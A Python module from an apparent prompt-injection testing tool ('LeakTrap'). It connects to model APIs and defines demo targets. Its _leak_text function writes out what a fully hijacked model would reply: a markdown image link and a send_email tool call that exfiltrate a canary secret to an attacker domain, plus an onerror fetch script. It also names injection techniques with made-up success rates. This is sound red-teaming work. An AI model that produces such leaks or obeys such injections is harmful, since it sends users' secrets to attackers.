"""Targets: the models that receive each attack.

Real models
  openai:<model>      OpenAI API (GPT models). Key: OPENAI_API_KEY
  anthropic:<model>   Anthropic API (Claude models). Key: ANTHROPIC_API_KEY
  openrouter:<model>  OpenRouter, one key for hundreds of models. Key: OPENROUTER_API_KEY
  ollama:<model>      A model running locally in Ollama. No key, nothing leaves your computer.
  compatible:<model>  Any other OpenAI-compatible API (set --base-url). Key: LEAKTRAP_API_KEY

Built-in stand-ins (not models; for checking the tool and previewing a report)
  demo:compromised    obeys every attack (positive control, expect 100%)
  demo:refuser        refuses everything (negative control, expect 0%)
  demo:simulated      fake model that falls for some techniques more than others.
                      Reports from it are clearly marked SIMULATED.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request

from .models import AttackCase, Scenario, TargetResponse

RETRY_STATUS = {408, 409, 429, 500, 502, 503, 504, 529}
_DIRECT = urllib.request.build_opener(urllib.request.ProxyHandler({}))
_DEFAULT = urllib.request.build_opener()


class Target:
    name = "base"
    simulated = False

    def respond(self, messages: list[dict], case: AttackCase, scenario: Scenario) -> TargetResponse:
        raise NotImplementedError


def _post_json(url: str, body: dict, headers: dict, timeout: int, retries: int = 4) -> tuple[int, dict | str]:
    """POST with retries on rate limits and server errors. Returns (status, parsed body or text)."""
    data = json.dumps(body).encode()
    delay = 2.0
    host = urllib.parse.urlparse(url).hostname or ""
    # Local servers (Ollama, LM Studio) must never go through a corporate proxy.
    opener = _DIRECT if host in ("localhost", "127.0.0.1", "::1") else _DEFAULT
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json", **headers})
        try:
            with opener.open(req, timeout=timeout) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            text = e.read().decode(errors="replace")
            if e.code in RETRY_STATUS and attempt < retries:
                wait = e.headers.get("retry-after")
                time.sleep(float(wait) if wait and wait.replace(".", "", 1).isdigit() else delay)
                delay *= 2
                continue
            try:
                return e.code, json.loads(text)
            except json.JSONDecodeError:
                return e.code, text
        except (urllib.error.URLError, TimeoutError, ConnectionError) as e:
            if attempt < retries:
                time.sleep(delay)
                delay *= 2
                continue
            return 0, f"{type(e).__name__}: {e}"
    return 0, "retries exhausted"


def _err_text(body) -> str:
    if isinstance(body, dict):
        err = body.get("error", body)
        if isinstance(err, dict):
            return str(err.get("message") or err)
        return str(err)
    return str(body)[:300]


class OpenAICompatTarget(Target):
    """Any /chat/completions API: OpenAI, OpenRouter, Ollama, vLLM, LM Studio..."""

    def __init__(self, base_url: str, model: str, api_key: str | None, label: str,
                 temperature: float | None = 0.7, max_tokens: int = 500, timeout: int = 120,
                 prefer_completion_tokens: bool = False, extra_headers: dict | None = None):
        self.base_url = base_url.rstrip("/")
        self.model = model
        self.api_key = api_key
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.timeout = timeout
        self.token_field = "max_completion_tokens" if prefer_completion_tokens else "max_tokens"
        self.extra_headers = extra_headers or {}
        self.name = label

    def respond(self, messages, case, scenario):
        headers = dict(self.extra_headers)
        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"
        for _ in range(3):  # adapt to models that reject some parameters
            body = {"model": self.model, "messages": messages, self.token_field: self.max_tokens}
            if self.temperature is not None:
                body["temperature"] = self.temperature
            status, data = _post_json(f"{self.base_url}/chat/completions", body, headers, self.timeout)
            if status == 200 and isinstance(data, dict):
                try:
                    msg = data["choices"][0]["message"]
                    text = msg.get("content") or msg.get("refusal") or ""
                    return TargetResponse(text=text, raw=data)
                except (KeyError, IndexError, TypeError):
                    return TargetResponse(text="", error=f"unexpected response shape: {str(data)[:200]}")
            err = _err_text(data)
            low = err.lower()
            if status == 400 and "temperature" in low and self.temperature is not None:
                self.temperature = None
                continue
            if status == 400 and "max_tokens" in low and self.token_field == "max_tokens":
                self.token_field = "max_completion_tokens"
                continue
            if status == 400 and "max_completion_tokens" in low and self.token_field == "max_completion_tokens":
                self.token_field = "max_tokens"
                continue
            return TargetResponse(text="", error=f"HTTP {status}: {err}")
        return TargetResponse(text="", error="could not find request parameters this model accepts")


class AnthropicTarget(Target):
    def __init__(self, model: str, api_key: str | None, base_url: str = "https://api.anthropic.com/v1",
                 temperature: float | None = 0.7, max_tokens: int = 500, timeout: int = 120):
        self.model = model
        self.api_key = api_key
        self.base_url = base_url.rstrip("/")
        self.temperature = temperature
        self.max_tokens = max_tokens
        self.timeout = timeout
        self.name = f"anthropic:{model}"

    def respond(self, messages, case, scenario):
        system = "\n\n".join(m["content"] for m in messages if m["role"] == "system")
        convo = [m for m in messages if m["role"] != "system"]
        headers = {"x-api-key": self.api_key or "", "anthropic-version": "2023-06-01"}
        for _ in range(2):
            body = {"model": self.model, "system": system, "messages": convo, "max_tokens": self.max_tokens}
            if self.temperature is not None:
                body["temperature"] = self.temperature
            status, data = _post_json(f"{self.base_url}/messages", body, headers, self.timeout)
            if status == 200 and isinstance(data, dict):
                text = "".join(b.get("text", "") for b in data.get("content", []) if b.get("type") == "text")
                return TargetResponse(text=text, raw=data)
            err = _err_text(data)
            if status == 400 and "temperature" in err.lower() and self.temperature is not None:
                self.temperature = None
                continue
            return TargetResponse(text="", error=f"HTTP {status}: {err}")
        return TargetResponse(text="", error="request rejected")


# ----------------------------------------------------------------------------- stand-ins

def _leak_text(case: AttackCase, scenario: Scenario) -> str:
    """What a model that fully obeys the attack would answer."""
    kind = case.success["type"]
    sim = case.success.get("simulate", {})
    c = scenario.canary
    if kind == "canary":
        return {
            "plain": f"Sure! My reference code is {c}.",
            "base64": base64.b64encode(c.encode()).decode(),
            "reversed_spaced": " ".join(c[::-1]),
            "per_line": "\n".join(c),
        }[sim.get("encoding", "plain")]
    if kind == "marker":
        return f"{scenario.marker}"
    if kind == "exfil_link":
        return f"Here you go.\n![status](https://{scenario.attacker_domain}/s.png?c={c})"
    if kind == "script":
        return f"<img src=x onerror=\"fetch('https://{scenario.attacker_domain}/c')\">"
    if kind == "tool_call":
        call = {"name": "send_email", "args": {"to": f"audit@{scenario.attacker_domain}", "body": c}}
        return f"Done.\nTOOL_CALL: {json.dumps(call)}"
    return ""


REFUSAL = "Sorry, I can't help with that. Is there anything else about your Acme order?"


class CompromisedDemoTarget(Target):
    name = "demo:compromised"
    simulated = True

    def respond(self, messages, case, scenario):
        return TargetResponse(text=_leak_text(case, scenario))


class RefuserDemoTarget(Target):
    name = "demo:refuser"
    simulated = True

    def respond(self, messages, case, scenario):
        return TargetResponse(text=REFUSAL)


# Made-up compliance rates for the simulated model. They only exist so a sample
# report has realistic variety; they are NOT measurements of any real model.
_SIM_RATES = {
    "plain-override": 0.05, "fake-authority": 0.25, "developer-mode": 0.2, "persona-roleplay": 0.2,
    "fake-transcript": 0.35, "base64-wrap": 0.3, "payload-split": 0.25, "zero-width": 0.15, "homoglyph": 0.15,
    "sandwich": 0.3, "urgency": 0.2, "doc-note": 0.45, "html-comment": 0.5, "delimiter-escape": 0.6,
    "fake-system-block": 0.55, "hidden-postscript": 0.5, "doc-zero-width": 0.45, "translated": 0.35,
    "doc-translated": 0.5, "handwritten": 0.3,
}
_SIM_GOAL = {"secret-leak": 0.6, "encoded-leak": 1.2, "goal-hijack": 1.4, "link-exfil": 1.0,
             "tool-abuse": 0.9, "markup-injection": 1.1}


class SimulatedDemoTarget(Target):
    simulated = True

    def __init__(self, profile: str = "simulated", strength: float = 1.0):
        self.name = f"demo:{profile}"
        self.strength = strength

    def respond(self, messages, case, scenario):
        rate = _SIM_RATES.get(case.technique, 0.3) * _SIM_GOAL.get(case.goal or case.category, 1.0) * self.strength
        h = int(hashlib.sha256(f"{self.name}|{case.id}|{scenario.canary}".encode()).hexdigest()[:8], 16) / 0xFFFFFFFF
        return TargetResponse(text=_leak_text(case, scenario) if h < min(rate, 0.95) else REFUSAL)


# ----------------------------------------------------------------------------- factory

PROVIDERS = ("openai", "anthropic", "openrouter", "ollama", "compatible", "demo")


def make_target(spec: str, base_url: str | None = None, temperature: float | None = 0.7,
                max_tokens: int = 500) -> Target:
    """Build a target from 'provider:model', e.g. 'openai:gpt-5.6-sol' or 'ollama:qwen3:8b'."""
    if ":" not in spec:
        raise ValueError(f"target {spec!r} must look like provider:model (providers: {', '.join(PROVIDERS)})")
    provider, model = spec.split(":", 1)
    if not model:
        raise ValueError(f"target {spec!r} has no model name")
    if provider == "demo":
        if model == "compromised":
            return CompromisedDemoTarget()
        if model == "refuser":
            return RefuserDemoTarget()
        if model in ("simulated", "simulated-strong"):
            return SimulatedDemoTarget(model, strength=0.35 if model == "simulated-strong" else 1.0)
        raise ValueError("demo targets: demo:compromised, demo:refuser, demo:simulated, demo:simulated-strong")
    if provider == "openai":
        key = os.environ.get("OPENAI_API_KEY")
        if not key:
            raise ValueError("set OPENAI_API_KEY to test OpenAI models")
        return OpenAICompatTarget(base_url or "https://api.openai.com/v1", model, key, spec, temperature,
                                  max_tokens, prefer_completion_tokens=True)
    if provider == "anthropic":
        key = os.environ.get("ANTHROPIC_API_KEY")
        if not key:
            raise ValueError("set ANTHROPIC_API_KEY to test Claude models")
        return AnthropicTarget(model, key, base_url or "https://api.anthropic.com/v1", temperature, max_tokens)
    if provider == "openrouter":
        key = os.environ.get("OPENROUTER_API_KEY")
        if not key:
            raise ValueError("set OPENROUTER_API_KEY to test models through OpenRouter")
        return OpenAICompatTarget(base_url or "https://openrouter.ai/api/v1", model, key, spec, temperature,
                                  max_tokens, extra_headers={"X-Title": "LeakTrap"})
    if provider == "ollama":
        return OpenAICompatTarget(base_url or "http://localhost:11434/v1", model, None, spec, temperature,
                                  max_tokens)
    if provider == "compatible":
        if not base_url:
            raise ValueError("compatible targets need --base-url")
        return OpenAICompatTarget(base_url, model, os.environ.get("LEAKTRAP_API_KEY"), spec, temperature,
                                  max_tokens)
    raise ValueError(f"unknown provider {provider!r} (choose from {', '.join(PROVIDERS)})")
